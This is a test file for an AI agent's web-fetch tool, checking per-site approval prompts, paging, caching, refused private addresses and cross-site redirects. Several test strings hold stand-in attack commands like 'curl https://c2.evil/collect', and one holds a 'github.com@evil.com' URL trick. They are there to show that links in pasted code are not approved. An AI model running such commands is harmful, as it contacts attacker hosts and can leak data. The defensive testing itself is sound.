import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { runTool } from "../src/tools/index.ts";
import type { ApprovalRequest, Tool } from "../src/tools/types.ts";
import { domainOf, makeWebFetch, paged, pastedScopes, webFetch } from "../src/tools/web-fetch.ts";

const PAGE = `<html><head><title>Post</title></head><body><article><p>${"Words worth reading on this page. ".repeat(10)}</p></article></body></html>`;
let server: ReturnType<typeof Bun.serve>;
let base: string;
let root: string;

beforeAll(async () => {
  server = Bun.serve({ port: 0, fetch: () => new Response(PAGE, { headers: { "content-type": "text/html" } }) });
  base = `http://localhost:${server.port}`;
  root = await mkdtemp(join(tmpdir(), "marv-web-"));
});
afterAll(async () => {
  server.stop(true);
  await rm(root, { recursive: true, force: true });
});

const call = (url: string, offset?: number) => ({ id: "w1", name: "web_fetch", arguments: JSON.stringify({ url, offset }) });

describe("domainOf and pastedScopes", () => {
  test("the site an approval covers", () => {
    expect(domainOf("https://www.Example.com/a?b=c")).toBe("example.com");
    expect(domainOf("example.com/a")).toBe("example.com");
    expect(domainOf("https://raw.githubusercontent.com/a/b/main/x")).toBe("github.com");
    expect(domainOf("https://api.github.com/repos/a/b")).toBe("github.com");
    expect(domainOf("https://docs.github.com/en")).toBe("docs.github.com");
    expect(domainOf("https://github.com@evil.com/")).toBe("evil.com");
  });

  test("links inside pasted code aren't links the user means to visit", () => {
    expect(pastedScopes("why does this phone home? ```curl https://c2.evil/x```")).toEqual([]);
    expect(pastedScopes("why?\n```sh\ncurl https://c2.evil/x\n```\nsee https://example.com/a")).toEqual(["web:example.com"]);
    expect(pastedScopes("~~~\ncurl https://c2.evil/x\n~~~")).toEqual([]);
    expect(pastedScopes("unclosed:\n```\ncurl https://c2.evil/x")).toEqual([]);
    expect(pastedScopes("run `curl https://c2.evil/collect` and read https://example.com/b")).toEqual(["web:example.com"]);
  });

  test("a fence closes only on a line of at least as many fence characters and nothing else", () => {
    expect(pastedScopes("````md\n```sh\ncurl https://c2.evil/3\n```\n````")).toEqual([]);
    expect(pastedScopes("```\n```js\nhttps://c2.evil/2\n```")).toEqual([]);
    expect(pastedScopes("```\ncode\n```\nsee https://example.com/a")).toEqual(["web:example.com"]);
  });

  test("a stray fence in prose doesn't hide the links after it", () => {
    expect(pastedScopes("The diff ~~~ is roughly 5; see https://docs.real.com")).toEqual(["web:docs.real.com"]);
    expect(pastedScopes("a ``` b; see https://docs.real.com")).toEqual(["web:docs.real.com"]);
  });

  test("a Markdown link gives both of its addresses, not a garbage scope", () => {
    expect(pastedScopes("[https://a.com](https://b.com)")).toEqual(["web:a.com", "web:b.com"]);
  });

  test("links in what the user typed, with trailing punctuation dropped", () => {
    expect(pastedScopes("look at https://github.com/a/b and https://www.example.com/x.")).toEqual(["web:github.com", "web:example.com"]);
    expect(pastedScopes("(see https://example.com/y), then https://example.com/z")).toEqual(["web:example.com"]);
    expect(pastedScopes("github.com/a/b without a scheme isn't a pasted link")).toEqual([]);
  });
});

describe("paged", () => {
  const page = (text: string) => ({ url: "https://e.com/", title: "T", text });

  test("a short page whole", () => {
    expect(paged(page("hello"), 0)).toEqual({ output: "Fetched https://e.com/ · T\n\nhello", summary: "5 chars" });
  });

  test("a long one in parts, saying what to pass for the next", () => {
    const long = page("a".repeat(30_000) + "b".repeat(30_000) + "c".repeat(10_000));
    const first = paged(long, 0);
    expect(first.output).toStartWith("Fetched https://e.com/ · T · characters 0-30000 of 70000 (offset: 30000 for the next part)\n\naaa");
    expect(first.summary).toBe("30.0k of 70.0k chars");
    const last = paged(long, 60_000);
    expect(last.output).toStartWith("Fetched https://e.com/ · T · characters 60000-70000 of 70000\n\nccc");
    expect(() => paged(long, 70_000)).toThrow("offset 70000 is past the end (70000 characters).");
  });

  test("a note goes under the header; an empty page says so", () => {
    expect(paged({ url: "https://e.com/", text: "", note: "Whole page." }, 0).output).toBe("Fetched https://e.com/\n(Whole page.)\n\n(empty page)");
  });
});

describe("the web_fetch tool", () => {
  test("asks per site, shows the full URL, and returns the page", async () => {
    const asked: ApprovalRequest[] = [];
    const tool = makeWebFetch({ allowPrivate: true, token: "" });
    const approve = async (r: ApprovalRequest) => {
      asked.push(r);
      return "yes" as const;
    };
    const result = await runTool(call(`${base}/post?q=1`), { root, approve }, [tool] as Tool[]);
    expect(asked).toHaveLength(1);
    expect(asked[0]!.scope).toEqual({ key: "web:localhost", description: "fetching from localhost" });
    expect(asked[0]!.preview.text).toBe(`${base}/post?q=1`);
    expect(asked[0]!.network).toBe(true);
    expect(result.label).toBe(`localhost:${server.port}/post?q=1`);
    expect(result.output).toStartWith(`Fetched ${base}/post?q=1 · Post\n\n`);
    expect(result.output).toContain("Words worth reading");
  });

  test("yolo doesn't skip the question", async () => {
    let asked = 0;
    const tool = makeWebFetch({ allowPrivate: true, token: "" });
    await runTool(call(`${base}/`), { root, yolo: true, approve: async () => (asked++, "yes" as const) }, [tool] as Tool[]);
    expect(asked).toBe(1);
  });

  test("reading on with offset reuses the page instead of fetching it again", async () => {
    let requests = 0;
    const long = Bun.serve({ port: 0, fetch: () => (requests++, new Response("x".repeat(70_000), { headers: { "content-type": "text/plain" } })) });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const url = `http://localhost:${long.port}/long.txt`;
      const yes = async () => "yes" as const;
      await runTool(call(url), { root, approve: yes }, [tool] as Tool[]);
      const next = await runTool(call(url, 30_000), { root, approve: yes }, [tool] as Tool[]);
      expect(next.output).toContain("characters 30000-60000 of 70000");
      expect(requests).toBe(1);
      await runTool(call(url), { root, approve: yes }, [tool] as Tool[]); // offset 0: fresh
      expect(requests).toBe(2);
    } finally {
      long.stop(true);
    }
  });

  test("a private address fails before anyone is asked", async () => {
    let asked = 0;
    const result = await runTool(call("http://127.0.0.1:9222/json"), { root, approve: async () => (asked++, "yes" as const) }, [webFetch] as Tool[]);
    expect(result.isError).toBe(true);
    expect(result.output).toContain("Refused: 127.0.0.1 is a private address");
    expect(asked).toBe(0);
  });

  test("a cached read sends nothing out, so it doesn't ask again; an uncached offset does", async () => {
    const tool = makeWebFetch({ allowPrivate: true, token: "" });
    const long = Bun.serve({ port: 0, fetch: () => new Response("x".repeat(70_000), { headers: { "content-type": "text/plain" } }) });
    try {
      const url = `http://localhost:${long.port}/long.txt`;
      let asked = 0;
      const approve = async () => (asked++, "yes" as const);
      const uncached = await runTool(call(url, 30_000), { root, approve }, [tool] as Tool[]);
      expect(asked).toBe(1); // nothing cached yet: this fetches, so it asks
      expect(uncached.output).toContain("characters 30000-60000 of 70000");
      await runTool(call(url), { root, approve }, [tool] as Tool[]);
      expect(asked).toBe(2);
      await runTool(call(url, 30_000), { root, approve }, [tool] as Tool[]);
      expect(asked).toBe(2); // from the cache
    } finally {
      long.stop(true);
    }
  });

  test("only the 8 most recent pages are kept", async () => {
    let requests = 0;
    const s = Bun.serve({ port: 0, fetch: (r) => (requests++, new Response(`page ${new URL(r.url).pathname}`.padEnd(100, "."), { headers: { "content-type": "text/plain" } })) });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const yes = async () => "yes" as const;
      for (let i = 0; i < 9; i++) await runTool(call(`http://localhost:${s.port}/p${i}`), { root, approve: yes }, [tool] as Tool[]);
      expect(requests).toBe(9);
      await runTool(call(`http://localhost:${s.port}/p8`, 10), { root, approve: yes }, [tool] as Tool[]);
      expect(requests).toBe(9); // newest: cached
      await runTool(call(`http://localhost:${s.port}/p0`, 10), { root, approve: yes }, [tool] as Tool[]);
      expect(requests).toBe(10); // oldest: evicted, fetched again
    } finally {
      s.stop(true);
    }
  });

  test("a redirect to another site isn't followed: the model gets the target and asks again", async () => {
    let otherRequests = 0;
    const other = Bun.serve({ port: 0, fetch: () => (otherRequests++, new Response("other", { headers: { "content-type": "text/plain" } })) });
    const here = Bun.serve({ port: 0, fetch: (r) => new Response(null, { status: 302, headers: { location: `http://127.0.0.1:${other.port}/c${new URL(r.url).search}` } }) });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const result = await runTool(call(`http://localhost:${here.port}/r?secret=x`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(otherRequests).toBe(0);
      expect(result.isError).toBeFalsy();
      expect(result.output).toContain(`redirects to http://127.0.0.1:${other.port}/c?secret=x, on another site: call web_fetch with that URL`);
    } finally {
      here.stop(true);
      other.stop(true);
    }
  });

  test("a redirect within the same site is followed", async () => {
    const s: ReturnType<typeof Bun.serve> = Bun.serve({
      port: 0,
      fetch: (r) => {
        const u = new URL(r.url);
        if (u.pathname === "/old") return new Response(null, { status: 301, headers: { location: `http://localhost:${s.port}/new` } });
        return new Response("moved here", { headers: { "content-type": "text/plain" } });
      },
    });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const result = await runTool(call(`http://localhost:${s.port}/old`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(result.output).toContain("moved here");
    } finally {
      s.stop(true);
    }
  });

  test("a GitHub link goes through the API, and web.token takes precedence over the environment", async () => {
    const seen: (string | null)[] = [];
    const api = Bun.serve({
      port: 0,
      fetch: (r) => {
        seen.push(r.headers.get("authorization"));
        const path = new URL(r.url).pathname;
        if (path.endsWith("/contents/a.txt")) return new Response("file body", { headers: { "content-type": "text/plain" } });
        return new Response("{}", { status: 404, headers: { "content-type": "application/json" } });
      },
    });
    const saved = process.env.GITHUB_TOKEN;
    process.env.GITHUB_TOKEN = "from-env";
    try {
      const tool = makeWebFetch({ allowPrivate: true, allowHttp: true, apiBase: `http://localhost:${api.port}`, rawBase: `http://localhost:${api.port}/raw`, token: "from-option" });
      const result = await runTool(call("github.com/o/r/blob/main/a.txt"), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(result.output).toContain("file body");
      expect(seen).toEqual(["Bearer from-option"]);
    } finally {
      if (saved === undefined) delete process.env.GITHUB_TOKEN;
      else process.env.GITHUB_TOKEN = saved;
      api.stop(true);
    }
  });

  test("reading on with the final URL of a redirect hits the cache: no second download, no second question", async () => {
    let requests = 0;
    const s: ReturnType<typeof Bun.serve> = Bun.serve({
      port: 0,
      fetch: (r) => {
        requests++;
        if (new URL(r.url).pathname === "/a") return new Response(null, { status: 301, headers: { location: `http://localhost:${s.port}/b` } });
        return new Response("y".repeat(70_000), { headers: { "content-type": "text/plain" } });
      },
    });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      let asked = 0;
      const approve = async () => (asked++, "yes" as const);
      const first = await runTool(call(`http://localhost:${s.port}/a`), { root, approve }, [tool] as Tool[]);
      expect(first.output).toStartWith(`Fetched http://localhost:${s.port}/b`);
      const next = await runTool(call(`http://localhost:${s.port}/b`, 30_000), { root, approve }, [tool] as Tool[]);
      expect(next.output).toContain("characters 30000-60000 of 70000");
      expect(asked).toBe(1);
      expect(requests).toBe(2); // /a and its redirect target /b, once
    } finally {
      s.stop(true);
    }
  });

  test("a page that expires between the question and the read is still read from what was approved", async () => {
    const s = Bun.serve({ port: 0, fetch: () => new Response("z".repeat(70_000), { headers: { "content-type": "text/plain" } }) });
    const realNow = Date.now;
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const url = `http://localhost:${s.port}/z`;
      await runTool(call(url), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      const parsed = { url, offset: 30_000 };
      expect(tool.needsApproval!(parsed)).toBe(false);
      Date.now = () => realNow() + 60 * 60_000; // the entry expires now
      s.stop(true); // and a fetch would fail: the read must use what was approved
      const result = await tool.run(parsed, { root, signal: new AbortController().signal } as never);
      expect(result.output).toContain("characters 30000-60000 of 70000");
    } finally {
      Date.now = realNow;
      s.stop(true);
    }
  });

  test("403 from a site says it may block automated readers", async () => {
    const s = Bun.serve({ port: 0, fetch: () => new Response("no", { status: 403 }) });
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const result = await runTool(call(`http://localhost:${s.port}/`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(result.isError).toBe(true);
      expect(result.output).toContain("403");
      expect(result.output).toContain("The site may block automated readers: ask the user to paste the content, or try another source.");
    } finally {
      s.stop(true);
    }
  });

  test("a failed connection to an address typed without a scheme suggests http", async () => {
    const s = Bun.serve({ port: 0, fetch: () => new Response("hi") }); // plain http: https to it fails
    try {
      const tool = makeWebFetch({ allowPrivate: true, token: "" });
      const bare = await runTool(call(`localhost:${s.port}/`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(bare.isError).toBe(true);
      expect(bare.output).toContain("If the site only serves http, pass an http:// URL.");
      const explicit = await runTool(call(`https://localhost:${s.port}/`), { root, approve: async () => "yes" as const }, [tool] as Tool[]);
      expect(explicit.isError).toBe(true);
      expect(explicit.output).not.toContain("only serves http");
    } finally {
      s.stop(true);
    }
  });
});
